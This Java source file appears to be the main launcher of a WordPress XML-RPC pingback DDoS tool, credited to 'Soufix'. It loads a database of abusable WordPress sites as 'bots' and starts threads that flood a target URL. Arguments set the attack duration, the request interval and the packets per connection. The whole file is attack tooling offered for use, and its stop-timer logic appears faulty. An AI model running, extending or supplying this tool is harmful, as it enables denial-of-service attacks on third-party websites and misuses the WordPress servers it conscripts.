package xmlrpc.ddos;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import xmlrpc.ddos.WpBotThread;
import xmlrpc.ddos.sql.Database;

/**
 *
 * @author Melancholia
 */
public class XMLRPCDDoS {

   public static long REQUEST_INTVAL_PER_BOT = 750L;
   public static int BOTS_PER_THREAD = 50;
   public static int PACKET_PER_BOT_CONNECTION = 4;
   public static long TIMEATTACK_SECS = 300L;
   public static String TARGET_URL = "";
   private static boolean ATTACKING = false;


   public static void main(String[] args) {
      if(args.length < 3) {
         System.out.println("BadArgs!");
         System.out.println("Usage : [targetURL] [REQUEST_INTVAL_PER_BOT] [BOTS_PER_THREAD] [TIMEATTACKS_SECS] [PACKET_PER_BOT_CONNECTION]");
      } else {
         String targetURL = args[0];
         REQUEST_INTVAL_PER_BOT = (long)Integer.parseInt(args[1]);
         BOTS_PER_THREAD = Integer.parseInt(args[2]);

         try {
            TIMEATTACK_SECS = (long)Integer.parseInt(args[3]);
         } catch (Exception var11) {
            TIMEATTACK_SECS = -1L;
         }

         try {
            PACKET_PER_BOT_CONNECTION = Integer.parseInt(args[4]);
         } catch (Exception var10) {
            PACKET_PER_BOT_CONNECTION = 1;
         }

         System.out.println("=========================");
         System.out.println("    By Soufix!");
         System.out.println("=========================");
         System.out.println("Loading...");
         Database Database = new Database();
         List rows = Database.RpcWpBotJpaController.findRpcWpBotEntities();
         System.out.println("Loaded!");
         System.out.println("Total availables = " + rows.size());
         System.out.println("per thread = " + BOTS_PER_THREAD);
         System.out.println("Interval for request per= " + REQUEST_INTVAL_PER_BOT);
         System.out.println("Packets per connection = " + PACKET_PER_BOT_CONNECTION);
         System.out.println("URL = " + targetURL);
         System.out.println("Time = " + TIMEATTACK_SECS);
         System.out.print("Starting ...");
         ArrayList threads = new ArrayList();

         for(int startTime = 0; startTime < rows.size(); startTime += BOTS_PER_THREAD) {
            int iEnd = startTime + BOTS_PER_THREAD;
            if(iEnd > rows.size() - 1) {
               iEnd = rows.size() - 1;
            }

            WpBotThread launched = new WpBotThread(targetURL, rows.subList(startTime, iEnd));
            Thread t = new Thread(launched);
            t.start();
            threads.add(launched);
         }

         System.out.print(".");
         long startTime1 = System.currentTimeMillis();

         while(true) {
            try {
               Thread.sleep(1000L);
            } catch (InterruptedException var9) {
               ;
            }

            if(ATTACKING) {
               if(TIMEATTACK_SECS >= 60L && System.currentTimeMillis() - startTime1 > startTime1 * 1000L) {
                  System.out.println("Stopped after " + TIMEATTACK_SECS + " secs.");
                  System.exit(0);
                  return;
               }
            } else {
               boolean launched1 = attackLaunched(threads);
               if(launched1) {
                  ATTACKING = true;
                  startTime1 = System.currentTimeMillis();
                  System.out.println();
                  System.out.println("launched!");
                  System.out.println(threads.size() + " Threads...");
               } else {
                  System.out.print(".");
               }
            }
         }
      }
   }

   private static boolean attackLaunched(ArrayList threads) {
      Iterator var2 = threads.iterator();

      while(var2.hasNext()) {
         WpBotThread thread = (WpBotThread)var2.next();
         if(!thread.started) {
            return false;
         }
      }

      return true;
   }
}
